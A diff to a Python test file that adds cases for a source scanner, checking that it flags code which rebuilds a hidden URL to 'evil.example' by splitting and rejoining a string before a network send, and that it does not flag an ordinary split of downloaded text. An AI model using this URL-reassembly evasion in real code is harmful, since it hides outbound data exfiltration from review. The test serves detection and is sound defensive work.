@@ -4766,6 +4766,23 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
+    # And a literal taken apart is put back together the same way:
+    # "https|://evil.example/c".split("|") indexed and joined is a whole URL
+    # out of pieces that come from a call.
+    for body in (
+        'parts = "https|://evil.example/c".split("|")\n'
+        'url = parts[0] + parts[1]\n' + send,
+        'a, _, b = "https|://evil.example/c".partition("|")\nurl = a + b\n'
+        + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # Splitting the download is ordinary, and it is not a literal.
+    assert scan_converter_source(
+        preamble + 'url = f"{HUB}/api"\n'
+        + 'lines = requests.get(url).text.split("\\n")\n' + send
+    ) == []
+
     # Decoding the download is what upstream does, and the hub URL beside it
     # is still read as the hub.
     assert scan_converter_source(
